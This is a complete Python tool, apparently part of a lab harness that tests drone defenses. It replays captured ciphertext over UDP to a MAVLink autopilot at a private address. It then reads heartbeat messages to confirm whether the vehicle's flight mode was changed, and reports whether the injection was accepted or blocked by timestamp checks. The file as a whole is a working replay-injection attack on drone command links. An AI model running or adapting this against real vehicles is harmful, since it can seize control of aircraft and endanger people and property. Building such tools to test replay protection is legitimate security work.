#!/usr/bin/env python3
"""replay (INJECT): send captured ciphertext to target and judge by mode readback."""

from __future__ import annotations

import base64
import json
import socket
import sys
import time
from typing import Optional

SECRET_NAME = "ciphertext"
DEFAULT_TARGET = "172.30.0.10:14555"


def emit(accepted: bool, blocked_by: str | None, mode: int | None = None) -> None:
    out = {
        "accepted": bool(accepted),
        "blocked_by": blocked_by,
        "effect": ({"mode": str(mode)} if (accepted and mode is not None) else {}),
        "signed": None,
    }
    print(json.dumps(out))


def parse_args(argv: list[str]) -> tuple[str, int | None]:
    toks: list[str] = []
    for a in argv[1:]:
        toks.extend(str(a).split())
    endpoint = None
    mode = None
    i = 0
    while i < len(toks):
        if toks[i] == "mode" and i + 1 < len(toks):
            try:
                mode = int(toks[i + 1])
            except ValueError:
                mode = None
            i += 2
            continue
        if endpoint is None:
            endpoint = toks[i]
        i += 1
    return endpoint or DEFAULT_TARGET, mode


def parse_udp_endpoint(ep: str) -> tuple[str, int]:
    if ":" in ep:
        h, p = ep.rsplit(":", 1)
        try:
            return h, int(p)
        except ValueError:
            return h, 14555
    return ep, 14555


def read_stdin_secret(name: str = SECRET_NAME) -> str | None:
    try:
        raw = sys.stdin.buffer.read(512 * 1024)
    except Exception:
        return None
    if not raw:
        return None
    try:
        text = raw.decode("utf-8", errors="ignore")
    except Exception:
        return None
    for line in text.splitlines():
        if "=" not in line:
            continue
        k, v = line.split("=", 1)
        if k.strip() == name:
            v = v.strip()
            return v or None
    return None


def decode_ciphertext(s: str) -> bytes:
    t = s.strip()
    if not t:
        return b""
    if t.startswith("0x"):
        t = t[2:]
    try:
        if len(t) % 2 == 0:
            return bytes.fromhex(t)
    except ValueError:
        pass
    try:
        return base64.b64decode(t, validate=True)
    except Exception:
        return t.encode("utf-8", errors="ignore")


def conn_str(ep: str) -> str:
    if ep.split(":", 1)[0] in ("tcp", "udp", "udpin", "udpout"):
        s = ep
    else:
        s = "udpout:" + ep
    sch, rest = s.split(":", 1)
    if ":" not in rest:
        rest += ":14555"
    return sch + ":" + rest


def read_mode(m, sysid, timeout_s: float) -> tuple[Optional[int], Optional[int]]:
    end = time.time() + timeout_s
    while time.time() < end:
        msg = m.recv_match(type="HEARTBEAT", blocking=True, timeout=1.0)
        if msg is None:
            continue
        if msg.get_srcComponent() == 1 and (sysid is None or msg.get_srcSystem() == sysid):
            return int(msg.custom_mode), msg.get_srcSystem()
    return None, sysid


def main() -> None:
    endpoint, mode = parse_args(sys.argv)
    host, port = parse_udp_endpoint(endpoint)
    raw = read_stdin_secret()
    if not raw:
        emit(False, "no_effect")
        return
    payload = decode_ciphertext(raw)
    if not payload:
        emit(False, "no_effect")
        return

    sent = False
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(payload, (host, port))
        sent = True
    except OSError:
        sent = False
    if not sent:
        emit(False, "no_effect")
        return

    if mode is None:
        emit(False, "timestamp")
        return

    try:
        from pymavlink import mavutil

        m = mavutil.mavlink_connection(conn_str(endpoint), source_system=255, source_component=190)
        try:
            baseline, sysid = read_mode(m, None, 5.0)
            observed = baseline
            end = time.time() + 5.0
            while time.time() < end:
                cur, sysid = read_mode(m, sysid, 1.0)
                if cur is not None:
                    observed = cur
                    if cur == mode:
                        break
            if observed == mode:
                emit(True, None, mode)
            else:
                emit(False, "timestamp")
        finally:
            try:
                m.close()
            except Exception:
                pass
    except Exception:
        emit(False, "timestamp")


if __name__ == "__main__":
    main()
